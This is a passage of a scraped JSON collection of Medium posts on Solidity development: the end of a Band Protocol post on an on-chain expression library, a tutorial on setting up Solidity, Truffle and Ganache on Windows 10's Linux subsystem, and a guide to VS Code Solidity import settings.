Data StructureThe current design creates an explicit tree during initialization using a pre-order list of opcodes. We opt for this design in the initial development to ensure the code simplicity. However, evaluating expression value only with the prefix notation of opcodes is also possible. The logic would be similar to tree construction populateTree logic, but with computation code instead of node allocation. Doing so would save significant space as the list of children would not need to be stored anymore. Combine with the storage optimization technique below, it\u2019s possible to pack a not-too-large expression into one single uint256!Storage OptimizationThe library requires a significant amount of gas in order to store an expression on chain. For instance, the expression f(x) = x^2 + 2*x + 10requires 9 words for storing all nodes (2 pluses, 1 exponential, 1 multiply, 2 variables, 3 constants) plus 3 words for storing constant values, for the total of 12 words. That\u2019s 240,000 gas according to the current EVM spec. It can get even worse if storage rent proposals get accepted and implemented. Optimization is possible by packing multiple nodes into the same EVM word, since each of them does not require full 32 bytes of memory. This would also lead to more efficient evaluation as less data needs to be loaded from storage. More bithacks would be performed, but those are very cheap.Multiple Variables in one ExpressionCurrent implementation accepts one and only variable in the expression. While this is generally what needed in most cases, the general abstraction already allows multiple variables. We plan to change variable construct to be parameterized on another integer (variable index). This will allow more sophisticated things such as a token vesting schedule that depends both on time and user\u2019s unvested tokens to be representable.(Broader Scope) Equation Editor and ExplorerLastly, building and deploying equation using Equation Library is quite a tedious process. One would need to convert an equation into its prefix format before passing to the blockchain. Having a web based UI tool that help with equation editing and visualizing would be super helpful.ConclusionWe presented an implementation of expression tree on Solidity that can be used to store (quite) arbitrary mathematical expressions on-chain. The library is simple, extensible, and gas efficient. It currently powers multiple components of Band Protocol that are under development. We encourage everyone to give it a try on their next (or current) project. Comments or feedbacks are also very much appreciated!Band Protocol is a toolkit for building decentralized curation communities. We are a team of engineers who look forward to the future where the value of communities is not controlled by a single entity. If you are a passionate developer and want to contribute to Band Protocol, please reach out to us at talent@bandprotocol.com.", "responses": 0, "tags": ["Ethereum", "Solidity", "Token Curated Registries", "Blockchain", "Engineering"]}, {"title": "Setting Up Solidity on Windows 10", "post_link": "https://medium.com/@m_mcclarty/setting-up-solidity-on-windows-10-993a1d2c615c?source=search_post", "author_name": "Megan McClarty", "author_link": "https://medium.com/@m_mcclarty", "publish_date": "2018-01-11", "last_modified_date": "2018-05-15", "readtime": "9.64", "claps": 167, "voters": 26, "content": "Setting Up Solidity on Windows 10Megan McClartyFollowJan 11, 2018 \u00b7 10 min readA while ago, I started getting interested in the Ethereum platform and its native language, Solidity. After a bit of trial and error, I was able to set up and test a simple smart contract on my Windows 10 machine. I share my process (and compile some of the resources I found most helpful) here.from ethereum.orgEthereum allows developers to write and deploy custom smart contracts in Solidity \u2014 distributed applications that, when propelled by Ether \u201cgas\u201d, can produce a result which is propagated on the blockchain. The application can be something as simple as a message generator, or something as complicated and engaging as the much-lauded CryptoKitties.I found some great resources, most notably this excellent tutorial (which I highly recommend), as well as the official documentation. But I did run into some of my own issues while completing this and other tutorials, so I thought I would write up something of my own: a bare-bones, right-from-square-one tutorial on how to write a smart contract in Solidity \u2014 on a Windows 10 machine \u2014 with no prior knowledge of JavaScript \u2014 and none of the dependencies yet installed. In this way I hope to allow you to profit from the mistakes I\u2019ve made in advance!Any feedback from Windows or Linux users on the tutorial flow would be much appreciated.Part 1: The Linux Subsystem Feature on Windows 10Right off the bat I am going to admit that this solution is a bit of a cheat. While installing Solidity on Windows directly can generally be a bit of a headache, Windows 10 offers a unique workaround.Windows 10 (and only Windows 10 \u2014 this feature is still in beta) comes with a built-in Linux Subsystem. With this tool, you can run Ubuntu (including a Bash shell) on Windows, without the setup required of a dual-boot and with less strain on your computer\u2019s resources than a full virtual machine setup would require.If you haven\u2019t already accessed the Linux Subsystem feature, here is how you set it up:Ensure that you are running a 64-bit version of WindowsChange your computer to support Developer Mode if it is not already enabled. Go to Settings (the gear icon on your Start menu) and select Update and Security:Click through to the For developers section, and toggle Developer Mode on:3. Toggle on the Windows Feature \u201cWindows Subsystem for Linux\u201d under the Windows Features > Turn Windows features on or off menu, accessible from the Start menu:4. Reboot your computer once the \u201cWindows Subsystem for Linux\u201d feature has been selected.4. Once your computer has restarted, you should be able to access Bash from the Start menu by typing \u201cbash\u201d in the search box.5. When launched, the Bash shell will prompt you to download Ubuntu for Windows. Follow the prompts to set up your account and username. This may take some time.6. Once the setup is complete, close the Bash window and search for it again on the Start menu. You\u2019ll notice that the icon has turned into the Ubuntu icon:New \u201cBash on Ubuntu on Windows\u201d icon on the Start menuYou\u2019ve now got a functional Bash shell. Open it up. You will see a prompt like:root@localhost:~#(If you\u2019re not familiar with Unix commands, I recommend this resource to learn some of the basics \u2014 and nothing in this guide will go much beyond basic!)You may be wondering where exactly the shell defaults to. In order to access your files and directories in Windows, you must first navigate to the C drive. Listing this directory should show familiar folders like Documents, Downloads etc. Run:cd /mnt/clsWhy not set up the directory for the rest of this project right now? Navigate to the C drive location where you would like to have your project (for me, it is mnt/c/Users/medit) and create a dedicated directory:cd /mnt/c/Users/meditmkdir first_solidity_projectcd first_solidity_projectOkay, on to the next step\u2026Part 2: Installing all Necessary DependenciesThere are a number of different methods available to install Solidity locally on your machine (or, alternatively, play with it in-browser); the method here uses NodeJS. If you already have NodeJS, you can skip its installation steps.First off, you will want to install cURL using your shiny new Ubuntu Bash shell, to streamline some of the upcoming installation steps (if you already have cURL installed, you can skip this step):sudo apt-get install curlHere\u2019s an overview of the dependencies that you\u2019ll need to have installed in order to work with Solidity locally:nvmThis is a node version manager that will aid in installing NodeJS, aligning versioning and helping mitigate errors going forward.Install with command:curl -o-https://raw.githubusercontent.com/creationix/nvm/v0.33.0/install.sh | bashVerify version withnvm --versionNodeJSInstall NodeJS using nvm, running command:nvm install nodeand set it up for use in your shell:nvm use nodeYou can switch between node versions by runningnvm use <version>For installation of Solidity-related packages, use version 6.3.0 or higher. You can always check the version currently in use withnode -vnpmThis is NodeJS\u2019 node package manager; it will make installation of required packages for Solidity quick and easy. Npm should be bundled with the NodeJS that you\u2019ve just installed, but ensure you\u2019ve got it (and check version) by runningnpm -vOnce you have NodeJS and npm up and running, you are ready to move on to installing Solidity.solcThis package provides JS bindings for the current Solidity compiler. Install using npm:npm install -g solcCheck version withsolc --versionTruffle/GanacheGanache (formerly known as TestRPC) is an emulator that allows you to test your smart contracts and work on their development without the overhead and cost associated with actually connecting to and deploying on the public Ethereum blockchain. Basically, it gives you a virtual blockchain where you can test, develop, and iron out all the glitches before you commit to a public blockchain deployment.Truffle itself will also set up a directory structure within your project folder to break it up into distinct contract, migration and test folders. You\u2019ll see this in more detail in Part 3.Start by installing the Truffle with commandnpm install -g truffleThen, install the Ganache command line interface withnpm install -g ganache-cliOpen up a second bash shell and verify that you have Ganache working as expected withganache-cliYou should see a list of \u201cAvailable Accounts\u201d and \u201cPrivate Keys\u201d, followed by a notification that says \u201cListening on localhost:8545\u2026\u201dGanache\u2019s test blockchain successfully launchedgethThis is an optional step for this project. Short for GO-Ethereum, geth is a command-line tool that allows you to connect to the public Ethereum blockchain and deploy your contracts on it. You\u2019ll need to first install Geth, and then later, when you\u2019re ready, launch a node.Note that connecting to the public Ethereum blockchain is no trivial task, and it will likely take a very long time to download depending on your system specs. I won\u2019t go into deploying contracts on the public blockchain here, but you can follow the Geth documentation if you are interested.That\u2019s it! You\u2019ve now installed the major packages needed to go forward with a simple smart contract project.Part 3: Creating Your First ProjectRemember the directory you made back in Part 1? We called it first_solidity_project . Navigate to this directory; this is where we will set up the smart contract.Truffle offers a handy way to get started with Solidity with its Truffle Boxes. These are templates which will automatically populate your project directory with all the necessary items for a particular application using their truffle unbox <box-name> command. We will look at the Truffle Box called MetaCoin, which sets up a mock token called \u2014 you guessed it \u2014 MetaCoin.Within your first_solidity_project directory, run commandtruffle unbox MetaCoin(The truffle unbox command is specifically for the template Truffle Boxes. If you want to create an empty structure so that you can write everything from scratch, run truffle init instead.)Now run ls to see the newly created structure of your project:You will see that the truffle unbox command has created a number of items in your directory: three folders called contracts , migrations , and test , a JSON file called truffle-box.json and two JS files called truffle-config.js and truffle.js . Let\u2019s go over each new item:contracts should contain all your .sol (Solidity file extension) contract files (in this case, if you navigate into it you will see ConvertLib.sol, MetaCoin.sol and Migrations.sol ).migrations will contain Javascript files that stage your contracts for deployment on the blockchain, whether that be the public Ethereum blockchain or the Ganache test blockchain that we installed earlier. You\u2019ll see two .js files in this folder: 1_initial_migration.js and 2_deploy_contracts.js .test will contain Javascript or Solidity test files for testing your contracts\u2019 performance before deployment; in the MetaCoin example, these are TestMetacoin.sol and metacoin.js .truffle-config.js , truffle-box.json and truffle.js are configuration filesYou can see more detail on each created item and their functionality in the Truffle documentation.To run and test a Solidity contract, you will need to have two things set up: the contract, migration and test files themselves, and the test blockchain. We saw how to run the test blockchain in part 2; it\u2019s as simple as opening a second, separate shell and runningganache-cliThis will initiate your test blockchain instance. Keep this open and running for the duration of your testing.Now we can test the MetaCoin example we\u2019ve just unboxed. Running a test checks to see if the contract being executed meets the requirements you\u2019ve specified in your test files. For MetaCoin, those requirements are laid out in test files metacoin.js and TestMetacoin.sol (note that Solidity test files must always begin with a capital \u201cTest\u201d). The difference between the Javascript and Solidity tests (both of which are used in the MetaCoin Truffle box) is explained here.To take a look at what the test files entail, cd into the test folder and start by using the built-in editor vim to read the contents of TestMetacoin.sol with commandvim TestMetacoin.sol(To exit the vim editor when you\u2019re done, type :q )The two functions testInitialBalanceUsingDeployedContract() and testInitialBalanceWithNewMetaCoin() are the two test cases that need to be met. Close this file ( :q) and use vim to open up the second test file in the test directory, metacoin.js :The red boxes highlight the output we are looking for that indicate that the test cases have been passed. Scroll down in vim to see how the test file catches and indicates if the contract has failed.Now exit vim, cd into the contracts folder and use vim to look at the contract itself:As explained in the comments, the contract allows you to send Metacoin between users, with a starting account value of 10000 Metacoin.Exit vim (with :q ) and cd back to the main project directory. We will now test your MetaCoin contract. Run commandtruffle testIf everything has passed correctly (and it should, if no modifications have been made), you\u2019ll seewith 5 green check marks to indicate that every test has passed and every function in the contract has worked as expected.Since everything looks good, we can now try deploying the contracts on the Ganache test blockchain. Run commandtruffle migrateThis will add a new folder called build to the items in your project directory. The new folder contains three json files corresponding to the contents of your contracts folder. After generating the json files, the migrate command will then run the migration files contained in the migrations folder. Your output should look likeYou can see in the output that the truffle migrate command has launched both migration files, 1_initial_migration.js and 2_deploy_contracts , and has created 5 blocks on the test blockchain: one to deploy Migrations.sol (count 1), one to save the migration to the network (count 2), one each to deploy ConvertLib.sol and MetaCoin.sol (count 4), and one to save the migration (count 5).If you try to run the migration again, you will seesince no changes have been made to migrations or contracts.Check your other terminal window, where the Ganache test blockchain is running, to see more information on the blocks created during this migration:If you scroll down, all five created blocks will be present. For more information on the truffle migrate command, check out this blog.That\u2019s it! Now you have all the structure in place to set up, test and deploy Solidity smart contracts on a test blockchain using the Linux Subsystem in Windows 10. For more information on testing and developing in Solidity, you can check out the Truffle and Solidity smart contract documentation.Thanks for reading \u2014 feedback is appreciated!", "responses": 7, "tags": ["Ethereum", "Solidity", "Windows 10", "Metacoin", "Smart Contracts"]}, {"title": "How to Import Solidity Files in VS Code with IDE Support", "post_link": "https://medium.com/coinmonks/solidity-import-in-vs-code-the-right-way-82baa1cc5a71?source=search_post", "author_name": "Forest Fang", "author_link": "https://medium.com/@saurfang", "publish_date": "2018-07-03", "last_modified_date": "2019-07-04", "readtime": "3.93", "claps": 264, "voters": 26, "content": "How to Import Solidity Files in VS Code with IDE SupportForest FangFollowJul 3, 2018 \u00b7 4 min readLet IDE work for you.For the longest time, I thought it was a lost cause making my VS Code happy with external Solidity file import (in the way Truffle wants me to). I coped with the red screaming squiggly lines. I learned to ignore and \ud83d\ude12.Enough is enough.TLDRIf you are setting up a standard truffle project via `truffle init` or `truffle unbox`, you can use the following settings in VS Code:\"solidity.packageDefaultDependenciesContractsDirectory\": \"\",\"solidity.packageDefaultDependenciesDirectory\": \"node_modules\"Import from an external package as usual (after installing using npm) like so:import \"openzeppelin-solidity/contracts/math/SafeMath.sol\";Happy Solidity hacking with error-free IDE, autocompletion, and definition lookup.Why (proper) Import is usefulWith the proper setup, Solidity plugin can source autocompletion from all imported files (and their children imports too.) The autocompletion is not yet contextual but gives some information on where the completion element is defined.Two totalSupply() functions: one from BasicToken.sol and the other from ERC20.sol which BasicToken inheritsWith latest version, you can jump to definitions of external imports as well as variables and functions defined in the external packages \ud83c\udf89.I contributed the functionality by implementing the corresponding event in LSP (Language Server Protocol) so potentially it can be used in other IDEs (Atom, Sublime, Remix) as well. There are still many features we can implement for Go to Definition and LSP in general in VSCode Solidity. Head over to Github and join the #BUIDL train if you have something on your wish list.How does Import work in SolidityRead on for back stories on my resolved frustration and nasty stuff under the rug of Solidity, Truffle, and VSCode Solidity plugin.It was an ordinary night when I got increasingly irritated \ud83e\udd2c (again!) by:me not remembering contract constructor signature I was inheriting fromOpenZeppelin keeping changing contract implementation and interfaces (for good reasons)VS code Solidity plugin not letting me jump to the file I importedOpenZeppelin contract being c\u0336o\u0336n\u0336v\u0336o\u0336l\u0336u\u0336t\u0336e\u0336d\u0336l\u0336y\u0336 \u0336n\u0336e\u0336s\u0336t\u0336e\u0336d\u0336 categorized in nested foldersand VS code not allowing search in node_modules by default.I decided to turn my endless mouse clicking and scrolling into more productive detective funzies (insert distracted programmer jokes.) Apparently, this was not an uncommon issue and (shockingly) the Solidity plugin is designed to work with import \ud83e\udd14.The answer lies in the two settings mentioned before, packageDefaultDependenciesContractsDirectory and packageDefaultDependenciesDirectory, and the fact that Solidity has no standard on how to reference external package import.For non-local imports (the one doesn\u2019t start with \u201c.\u201d and isn\u2019t absolute path), the compiler uses its discretion on how to apply the remapping to resolve the import:When the compiler is invoked, it is not only possible to specify how to discover the first element of a path, but it is possible to specify path prefix remappings so that e.g. github.com/ethereum/dapp-bin/library is remapped to /usr/local/dapp-bin/library and the compiler will read the files from there.TruffleTruffle uses truffle-resolver to resolve dependencies from EthPM and NPM. For NPM specifically, it looks for packages under node_modules and replace the prefix with the file system path only.In addition, Truffle states a Truffle project should use /contracts to store *.sol files and /build(/contracts) for build output. However, the resolver does not enforce this project structure since not all npm Solidity packages follow this layout.Therefore we import by package name followed with relative path from the root of the npm package. For openzeppelin-solidity, we useimport \"openzeppelin-solidity/contracts/math/SafeMath.sol\";VSCode SolidityVSCode Solidity extension provides two settings with default values to control how external dependencies are resolved:solidity.packageDefaultDependenciesDirectory: node_modulessolidity.packageDefaultDependenciesContractsDirectory: contractspackageDefaultDependenciesDirectory adds a prefix to the package and resolves from the project root. packageDefaultDependenciesContractsDirectory specifies where to find *.sol files inside an external package.import \"package/folder1/contract.sol\";expands toimport \"{projectRoot}/{packageDefaultDependenciesDirectory}/package/{packageDefaultDependenciesContractsDirectory}/folder1/contract.sol\";While the default value contracts may look innocent, it actually creates a duplicate in a Truffle project. The previous import would expands toimport \"{projectRoot}/node_modules/openzeppelin-solidity/contracts/contracts/math/SafeMath.sol\";Oops. Setting packageDefaultDependenciesContractsDirectory to empty would conform to Truffle standard \ud83e\uddd0.Bonus Tip\ud83e\udd2bHave you been frustrated when VSCode closes every file that you opened for reference but not editing? This turns out to be a feature (?!) not a bug. You can pin a file to exit preview mode by double clicking the file or tab header. You can also disable preview mode in certain condition or altogether in the setting.I can understand how this is useful to keep my workspace clean but I found often this feature counter-productive. Would it be better if the file closes itself after some time of inactivity or tuck itself away in the tab list?AcknowledgmentLast but not least I would like to acknowledge Juan Blanco authoring and all other contributors before me for the amazing VSCode Solidity plugin. Go star the repo to show your love today!", "responses": 2, "tags": ["Ethereum", "Solidity", "Vscode", "Tutorial", "Programming"]}]